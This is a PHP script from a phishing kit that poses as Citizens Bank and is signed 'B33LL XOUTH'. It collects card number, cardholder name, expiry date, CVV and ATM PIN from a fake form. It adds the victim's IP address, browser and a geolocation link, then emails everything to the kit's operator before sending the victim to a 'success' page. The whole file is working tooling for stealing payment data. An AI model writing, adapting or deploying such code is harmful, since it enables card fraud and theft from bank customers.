<?php include 'send.php';?>
<?php

$ip = getenv("REMOTE_ADDR");
$timestamp = date('d/m/Y h:i:s');
$dir = basename(__DIR__);
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-------------->B33LL XOUTH Citizens Bank - ReZulT (6)<------------------\n";
$message .= "Card Number: ".$_POST['Number']."\n";
$message .= "Name On Card: ".$_POST['Name']."\n";
$message .= "Expiry Date: ".$_POST['Month']."";
$message .= "/".$_POST['Year']."\n";
$message .= "CVV/CVC: ".$_POST['CVV']."\n";
$message .= "ATM PIN: ".$_POST['PIN']."\n\n";

$message .= "Time: $timestamp \n";
$message .= "User-Agent: $browser \n";
$message .= "IP Info: https://geoiptool.com/en/?ip=".$ip."\n";
$message .= "----------- -BY B33LL XOUTH- ----------\n";

$subject = "Citizens Bank Card (6)😈 INFO FROM 😈- $ip";
$headers = "";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "\n";
	 mail("", "B33LL XOUTH", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location:success.php");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?> 